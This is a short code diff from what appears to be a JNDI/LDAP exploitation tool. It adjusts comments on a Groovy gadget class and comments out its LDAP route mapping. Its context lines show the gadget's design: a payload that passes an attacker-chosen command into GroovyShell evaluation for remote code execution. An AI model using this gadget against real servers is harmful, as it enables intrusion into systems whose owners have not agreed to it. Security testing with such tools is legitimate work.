@@ -19,14 +19,14 @@ import static artsploit.Utilities.serialize;
  *  When bean is created on the server side, we can control its class name and setter methods,
  *   so we can leverage {@link groovy.lang.GroovyShell#evaluate} method to execute arbitrary Groovy script
  *
- * @see https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html for details
+ * @see <a href="https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html">for details</a>
  *
  * Requires:
- *  Tomcat and Groovy in classpath
+ *  Exploit and Groovy in classpath
  *
  * @author https://twitter.com/orange_8361 and https://github.com/welk1n
  */
-@LdapMapping(uri = { "/o=groovy" })
+//@LdapMapping(uri = { "/o=groovy" })
 public class Groovy implements LdapController {
 
     String payload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
